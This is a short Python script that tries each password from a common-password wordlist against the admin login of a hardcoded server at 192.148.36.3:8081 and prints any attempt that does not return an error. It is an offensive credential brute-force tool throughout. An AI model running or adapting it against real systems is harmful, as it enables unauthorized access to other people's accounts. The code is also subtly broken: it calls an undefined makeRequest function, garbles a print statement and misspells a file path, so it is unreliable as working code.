import json
import requests

siteUrl = 'http://192.148.36.3:8081'

def getAdminPassword(identifier, password):
    global siteUrl
    data = {'identifier': 'admin', 'password': password }
    headers = {'Content-Type': 'application/json'}
    r = requests.post(siteUrl + '/login', json.dumps(data), headers=headers)
    return r.json()

wordlist = open('/root/Deskop/wordlists/100-common-passwords.txt', 'r')

for word in wordlist:
    word = word[:-1]

    res = makeRequest(word)

    if "Error" not in res:
        print('*'*10)
        print("Username: Admin")
        print(password, {}).format(word)
        print('*'*10)
        print ("Login Response:\n", res)
